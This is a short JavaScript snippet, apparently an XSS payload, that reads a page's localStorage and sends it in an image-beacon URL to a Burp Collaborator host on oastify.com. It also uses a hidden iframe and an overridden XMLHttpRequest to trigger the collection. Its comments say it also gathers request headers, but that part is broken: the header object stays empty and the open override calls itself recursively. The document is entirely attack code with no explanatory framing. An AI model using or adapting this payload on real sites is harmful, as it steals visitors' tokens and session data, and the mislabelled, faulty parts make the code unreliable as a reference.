(function() {
    // Function to collect request headers and localStorage data
    function collectData() {
        var requestHeadersList = {};
        var localStorageData = JSON.stringify(localStorage);

        // Create an image tag to send the data to your Burp Collaborator server
        var img = new Image();
        img.src = 'http://88e1m0fo5n7zwxibijm4um8bw22tqoncc.oastify.com/?requestHeaders=' + encodeURIComponent(JSON.stringify(requestHeadersList)) +
            '&localStorageData=' + encodeURIComponent(localStorageData);

        // Inject the image into the body to trigger the request
        document.body.appendChild(img);
    }

    // Create a hidden iframe to intercept and collect request headers
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    iframe.contentWindow.XMLHttpRequest = function() {
        var xhr = new window.XMLHttpRequest();
        xhr.open = function(method, url, async) {
            window.setTimeout(collectData, 0); // Collect data after the request is set up
            return xhr.open.apply(xhr, arguments);
        };
        return xhr;
    };

    // Trigger the collection by making a dummy request
    var xhr = new iframe.contentWindow.XMLHttpRequest();
    xhr.open('GET', window.location.href, true);
    xhr.send();
})();
